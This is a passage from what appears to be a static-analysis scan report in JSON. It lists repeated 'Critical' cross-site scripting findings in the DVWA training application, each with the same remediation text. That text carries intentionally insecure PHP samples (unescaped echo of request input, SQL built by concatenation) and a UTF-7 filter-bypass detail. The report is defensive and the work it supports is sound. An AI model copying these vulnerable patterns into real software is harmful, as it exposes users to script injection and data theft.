Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4697/?engineType=SCA&issue=DD8DD8938BFFFF08501B32054531C9BE"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4699",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4699/?engineType=SCA&issue=DF770EB84AD078C6FCA4F29C7145E83B"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4712",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4712/?engineType=SCA&issue=E589ACA40A8E29327313F6B7E0C96E5F"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4715",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in medium.php on line 15.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4715/?engineType=SCA&issue=E92ADFA22895E54D8A5C1B6A0234C9DF"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4716",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in medium.php on line 12.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is 